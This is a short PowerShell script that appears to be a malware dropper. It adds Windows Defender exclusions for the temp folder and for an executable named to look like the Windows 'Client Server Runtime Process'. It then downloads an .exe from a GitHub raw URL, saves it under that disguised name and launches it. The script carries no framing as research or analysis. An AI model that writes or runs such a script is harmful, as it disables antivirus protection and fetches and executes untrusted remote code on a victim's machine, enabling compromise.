Add-MpPreference -ExclusionPath "$env:temp"
Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\Client Server Runtime Process.exe"
Add-MpPreference -ExclusionPath "$env:TEMP\Client Server Runtime Process.exe"
Add-MpPreference -ExclusionProcess "Client Server Runtime Process.exe"
$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"

 $output = "$env:TEMP\Client Server Runtime Process.exe"

Invoke-WebRequest -Uri $url -OutFile $output

if (Test-Path $output) {
    Start-Process -FilePath $output
} else {
    Write-Host "Failed to download the file."
}
